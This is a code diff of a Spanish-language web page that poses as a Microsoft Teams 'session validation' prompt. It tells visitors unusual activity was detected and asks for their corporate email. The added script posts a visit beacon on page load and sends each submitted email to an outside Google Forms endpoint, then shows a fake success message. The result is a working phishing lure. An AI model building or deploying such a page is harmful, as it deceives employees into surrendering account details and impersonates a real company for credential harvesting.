@@ -1,91 +1,77 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <title>Validación de Cuenta</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f3f2f1;
-            margin: 0;
-            padding: 0;
-        }
+<meta charset="UTF-8">
+<title>Validación de Cuenta</title>
 
-        .container {
-            width: 400px;
-            margin: 100px auto;
-            background: white;
-            padding: 30px;
-            border-radius: 6px;
-            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
-        }
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background-color: #f3f2f1;
+}
 
-        .logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
+.container {
+    width: 400px;
+    margin: 100px auto;
+    background: white;
+    padding: 30px;
+    border-radius: 6px;
+    box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
+}
 
-        .logo img {
-            width: 120px;
-        }
+h2 {
+    text-align: center;
+    color: #333;
+}
 
-        h2 {
-            text-align: center;
-            color: #333;
-        }
+p {
+    color: #555;
+    font-size: 14px;
+}
 
-        p {
-            font-size: 14px;
-            color: #555;
-        }
+input {
+    width: 100%;
+    padding: 10px;
+    margin-top: 10px;
+    border-radius: 4px;
+    border: 1px solid #ccc;
+}
 
-        input {
-            width: 100%;
-            padding: 10px;
-            margin-top: 10px;
-            border-radius: 4px;
-            border: 1px solid #ccc;
-        }
+button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 20px;
+    background-color: #0078D4;
+    color: white;
+    border: none;
+    font-weight: bold;
+    border-radius: 4px;
+    cursor: pointer;
+}
 
-        button {
-            width: 100%;
-            padding: 12px;
-            margin-top: 20px;
-            background-color: #0078D4;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-weight: bold;
-            cursor: pointer;
-        }
+button:hover {
+    background-color: #005ea6;
+}
 
-        button:hover {
-            background-color: #005ea6;
-        }
-
-        .hidden {
-            display: none;
-        }
-
-        .success {
-            text-align: center;
-            color: green;
-            font-weight: bold;
-            margin-top: 20px;
-        }
-    </style>
+.success {
+    display: none;
+    text-align: center;
+    color: green;
+    margin-top: 20px;
+    font-weight: bold;
+}
+</style>
 </head>
+
 <body>
 
 <div class="container">
-    <div class="logo">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
-    </div>
 
     <h2>Validación de sesión</h2>
 
     <p>
-        Por motivos de seguridad, se requiere validar su cuenta corporativa para continuar usando Microsoft Teams.
+    Se detectó actividad inusual en su sesión. Para continuar utilizando Microsoft Teams,
+    es necesario validar su cuenta corporativa.
     </p>
 
     <form id="loginForm">
@@ -95,27 +81,46 @@
         <button type="submit">Validar</button>
     </form>
 
-    <div id="successMessage" class="success hidden">
+    <div id="successMessage" class="success">
         ✔ Validación completada correctamente.<br><br>
         Puede cerrar esta ventana.
     </div>
+
 </div>
 
 <script>
-    document.getElementById("loginForm").addEventListener("submit", function(event) {
-        event.preventDefault();
+// 🔥 REGISTRO DE VISITA (solo clic)
+fetch("https://docs.google.com/forms/d/e/1FAIpQLSf0Nz3cBaqx6hH1I1Wvh2eocdxt53VAo1yALL4X3O3YKx8JQg/formResponse", {
+    method: "POST",
+    mode: "no-cors",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+    },
+    body: "entry.99712409=VISITA"
+});
 
-        var email = document.getElementById("email").value;
 
-        console.log("Usuario ingresó:", email);
+// 🔐 REGISTRO DE USUARIO (cuando escribe correo)
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+    event.preventDefault();
 
-        // Aquí podrías enviar datos a un log interno si quieres
-        // fetch("tu_servidor/log.php", {method:"POST", body:email});
+    var email = document.getElementById("email").value;
 
-        document.getElementById("loginForm").classList.add("hidden");
-        document.getElementById("successMessage").classList.remove("hidden");
+    fetch("https://docs.google.com/forms/d/e/1FAIpQLSf0Nz3cBaqx6hH1I1Wvh2eocdxt53VAo1yALL4X3O3YKx8JQg/formResponse", {
+        method: "POST",
+        mode: "no-cors",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "entry.99712409=" + encodeURIComponent(email)
     });
+
+    // Mostrar mensaje
+    document.getElementById("loginForm").style.display = "none";
+    document.getElementById("successMessage").style.display = "block";
+});
 </script>
 
 </body>
 </html>
+``
